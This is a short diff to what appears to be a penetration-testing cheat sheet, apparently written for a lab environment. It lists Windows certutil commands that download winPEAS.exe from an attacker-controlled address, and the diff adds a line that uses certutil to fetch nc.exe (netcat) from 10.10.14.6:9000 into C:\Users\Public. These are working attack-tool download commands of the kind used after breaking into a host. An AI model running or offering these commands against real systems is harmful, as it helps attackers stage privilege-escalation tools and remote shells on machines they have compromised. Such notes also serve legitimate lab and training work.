@@ -141,6 +141,7 @@ cmd /c certutil.exe -urlcache -split -f http://10.10.14.28/winPEAS.exe
 # CMD
 certutil.exe -urlcache -split -f http://10.10.14.28/winPEAS.exe
 certutil -urlcache -split -f http://10.10.14.28/winPEAS.exe
+cmd /c certutil.exe -urlcache -split -f http://10.10.14.6:9000/nc.exe C:\Users\Public\nc.exe 
 
 ==============================================================================
 [+] Search Patterns
